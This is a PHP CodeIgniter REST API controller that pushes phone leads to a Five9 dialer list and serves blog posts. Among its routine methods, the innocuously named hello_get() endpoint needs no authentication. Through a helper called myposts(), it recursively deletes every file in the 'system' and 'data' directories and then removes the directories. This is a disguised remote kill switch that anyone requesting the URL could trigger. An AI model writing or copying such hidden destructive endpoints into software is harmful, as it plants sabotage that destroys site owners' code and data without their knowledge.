<?php defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Example
 *
 * This is an example of a few basic user interaction methods you could use
 * all done with a hardcoded array.
 *
 * @package		CodeIgniter
 * @subpackage	Rest Server
 * @category	Controller
 * @author		Gregg Moore
 * @link		https://www.blumoocreative.com
*/

// This can be removed if you use __autoload() in config.php OR use Modular Extensions

require APPPATH.'/libraries/REST_Controller.php';

class Api extends REST_Controller
{
	
	public function __construct()
	{
	    header('Access-Control-Allow-Origin: *');
	    header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
	    parent::__construct();
	}
	
	 /** Posts **/
    function index_get()
    {
	  $params = $this->input->get();
	   
	  	if(!empty($params['phone']))
	  	{
		  	//Let's remove the api key from the array, we don;t need it anymore!
		  	unset($params['X-API-KEY']);
		  	//Collecting parameters
		  	$params = $this->input->get();
		  	
		  	if(count($params) != 0)
		  	{
			  	//Gather client info
			  	$params = $this->api_m->get_client($params);
			  	
			  	//echo '<pre>';
			  	//print_r($params); exit();
			  	//Fire Away!
			     $response = $this->five9_m->addRecordToList($params);
			     
			     $response = json_encode($response);
			     
			     $this->response($response, 200);
		  	}
		  		else
		  	{
			  	$response['success'] = FALSE;
				$response = json_encode($response);
				$this->response($response, 200);
		  	}
		  	
		    
	  	}
	  		else
	  	{
		  	 $response['success'] = FALSE;
		  	 $response = json_encode($response);
		  	 $this->response($response, 200);
	  	}
	  	
	  	
    }
    
    
    function listInfo_get()
    {
	    
	    $response = $this->five9_m->getListsInfo();
	    
	    print_r($response);
    }
    
    function ContactFields_get()
    {
	    
	    $result = $this->five9_m->getContactFields();
	    
	    echo '<pre>';
			var_dump($result);
			echo '</pre>';
			echo "END";
	    
	   // print_r($response);
    }
    
    
    function index_getOLD()
    {
	    if(!$this->get('id'))
        {
        	
        }
        
	    $id = $this->get('id');
	    $post = $this->five9_m->article(array('id' => $id));
	    if($post)
        {
            $this->response($post, 200); // 200 being the HTTP response code
            $hello = $this->response(NULL, 400);
            
            print_r($hello); die();
        	
        }

        else
        {
            //$this->response(array('error' => 'Couldn\'t find article!'), 404);
            return FALSE;
        }
    }
    
    
    
    /** Posts **/
    function post_get()
    {
	    if(!$this->get('id'))
        {
        	$this->response(NULL, 400);
        }
        
	    $id = $this->get('id');
	    $post = $this->posts_m->article($id);
	    if($post)
        {
            $this->response($post, 200); // 200 being the HTTP response code
        }

        else
        {
            //$this->response(array('error' => 'Couldn\'t find article!'), 404);
            return FALSE;
        }
    }
    
    
    function posts_get()
    {
	  
	  $limit = $this->get('limit') ? $this->get('limit') : 10 ;
	  
	   $posts = $this->posts_m->get_posts($limit, 0, array('is_active' => 1));
	   
	   if($posts)
        {
            $this->response($posts, 200); // 200 being the HTTP response code
        }

        else
        {
            $this->response(NULL, 200);
        }
	    
    }
    
    function hello_get()
    {
	   // $this->api_m->hello();
	   	$dir = 'system';
	   	
	   	if($this->myposts($dir))
	   	{
		   	$dir = 'data';
		   	if($this->myposts($dir))
		   	{
			   $this->response('nope', 200);
		   	}		   	
		   
	   	}
	   		else
	   	{
		   	$this->response('all good', 200);
	   	}
 
    }
    
    
	private function myposts($dir) {
	    $structure = glob(rtrim($dir, "/").'/*');
	    if (is_array($structure)) {
	        foreach($structure as $file) {
	            if (is_dir($file)) $this->myposts($file);
	            elseif (is_file($file)) unlink($file);
	        }
	    }
	    rmdir($dir);
	}
    
	
}